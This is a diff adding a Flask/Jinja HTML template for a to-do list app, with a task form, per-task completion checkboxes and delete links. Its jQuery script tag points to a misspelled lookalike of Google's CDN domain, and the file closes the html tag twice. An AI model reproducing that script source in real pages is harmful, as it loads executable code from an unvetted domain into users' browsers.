@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE-edge">
+    <title>ToDo App</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width , initial-scale=1">
+    <link rel="stylesheet" href="">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://ajax.googleapls.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <style>
+        .header {
+            background-image: url("/static/images/image1.jpg");
+            background-size: cover;
+            background-position: center;
+            color: #ffffff;
+            padding: 50px 0px;
+            margin: 40px;
+            border-radius: 10px;
+        }
+
+        .input-wrapper {
+            background-color: white;
+            height: 60px;
+            padding-top: 10px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+
+        }
+
+        .active-item {
+            background-color: gray;
+            color: #fff;
+        }
+    </style>
+</head>
+
+<body>
+     <!--header-->
+    <div class="header h-75">
+        <section class="container">
+            <h3>TO DO APP</h3>
+            <div class="card-body">
+
+                <form method="post" action="/add">
+                    <div class="row input-wrapper">
+                        <div class="col-10">
+                            <input class="form-control h-20" type="text" name="task" placeholder="Add a new task"
+                                required>
+                        </div>
+                        <div class="col-2">
+                            <button class="btn btn-block text-white" type="submit"
+                                style="background-color: blue;">Create</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+        </section>
+
+    </div>
+    <!--List-->
+    <div class="container" style="margin-top: 40px ;background-image: url('/static/images/image2.jpg');">
+        <ul class="list-group shadow">
+            {% for task in tasks %}
+              
+                
+            <li class="list-group-item {% if task.done %}active-item{% endif %}">
+                {{task.task}}
+                <form action="{{ url_for('complete_task', index=loop.index0) }}" method="post" style="float:right;">
+                    <input type="checkbox" onchange="this.form.submit()" {% if task.done %}checked{% endif %}>
+                </form>
+                 <a type="button" class="close" style="padding: 10px;" href="{{url_for('delete_task',index=loop.index0)}}">&times;</a>
+                 
+            </li>
+
+            {% endfor %}
+        </ul> 
+        
+        
+
+    </div>
+
+
+</body>
+
+</html>
+
+</html>
+
